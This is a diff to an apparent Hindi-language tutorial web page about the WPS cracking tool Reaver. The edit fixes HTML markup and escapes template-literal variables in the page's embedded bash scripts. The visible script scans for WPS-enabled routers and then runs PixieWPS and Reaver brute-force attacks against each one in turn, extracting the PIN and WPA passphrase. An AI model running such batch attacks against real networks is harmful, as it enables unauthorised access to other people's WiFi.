@@ -13,6 +13,7 @@ export default function Reaver() {
       <h2>What is Reaver?</h2>
       <p>
         Reaver एक शक्तिशाली WPS (WiFi Protected Setup) PIN ब्रूट फोर्स अटैक टूल है जो WPS इनेबल्ड राउटर्स का 8-डिजिट PIN क्रैक करके WPA/WPA2 पासवर्ड सीधे निकाल सकता है। यह टूल WiFi सिक्योरिटी टेस्टिंग में सबसे प्रभावी हथियारों में से एक है क्योंकि WPS प्रोटोकॉल में मूलभूत डिज़ाइन कमज़ोरी है — PIN वेरिफिकेशन में आधा PIN पहले और आधा बाद में चेक होता है, जिससे कुल 11,000 कॉम्बिनेशन्स ही ट्राई करने पड़ते हैं। यह बहुत कम है — ब्रूट फोर्स आसान है।
+      </p>
       <p>
         Reaver Craig Heffner ने 2011 में बनाया था। यह C भाषा में लिखा गया है और Linux के लिए डिज़ाइन किया गया है। यह काली लिनक्स और काली नेटहंटर दोनों में प्री-इंस्टॉल्ड आता है। Reaver का सबसे बड़ा फायदा यह है कि अगर राउटर WPS इनेबल्ड है तो पासवर्ड मिलना लगभग पक्का है — बस समय की बात है। PixieWPS के साथ कॉम्बिनेशन में यह सेकंड्स में पासवर्ड निकाल सकता है। Reaver C भाषा में लिखा गया है जो इसे बहुत तेज़ और मेमोरी-एफिशिएंट बनाता है। यह Linux, Kali Linux, Kali NetHunter सभी पर चलता है।
       </p>
@@ -383,14 +384,14 @@ while read line; do
 
         # पहले PixieWPS ट्राई करें
         echo "[+] PixieWPS ट्राई कर रहे हैं..."
-        sudo timeout 120 reaver -i $INTERFACE -b $BSSID -c $CHANNEL -K 1 -vv > $RESULTS_DIR/pixie_${BSSID}.txt 2>&1
+        sudo timeout 120 reaver -i $INTERFACE -b $BSSID -c $CHANNEL -K 1 -vv > $RESULTS_DIR/pixie_\${BSSID}.txt 2>&1
 
-        if grep -q "WPS PIN" $RESULTS_DIR/pixie_${BSSID}.txt; then
+        if grep -q "WPS PIN" $RESULTS_DIR/pixie_\${BSSID}.txt; then
             echo "[+] PixieWPS में सफल! $ESSID"
-            cat $RESULTS_DIR/pixie_${BSSID}.txt | grep -E "PIN|PSK|SSID"
+            cat $RESULTS_DIR/pixie_\${BSSID}.txt | grep -E "PIN|PSK|SSID"
         else
             echo "[+] नॉर्मल Reaver अटैक..."
-            sudo reaver -i $INTERFACE -b $BSSID -c $CHANNEL -vv -d 5 -l 300 -o $RESULTS_DIR/reaver_${BSSID}.txt
+            sudo reaver -i $INTERFACE -b $BSSID -c $CHANNEL -vv -d 5 -l 300 -o $RESULTS_DIR/reaver_\${BSSID}.txt
         fi
     fi
 done < $RESULTS_DIR/wash.txt`}
@@ -418,7 +419,7 @@ echo "[+] $INTERFACE को monitor mode में ला रहे हैं...
 sudo airmon-ng start $INTERFACE
 
 # वेरिफाई करें
-MONITOR="${INTERFACE}mon"
+MONITOR="\${INTERFACE}mon"
 if iwconfig $MONITOR 2>/dev/null | grep -q "Mode:Monitor"; then
     echo "[+] Monitor mode सफल: $MONITOR"
 else
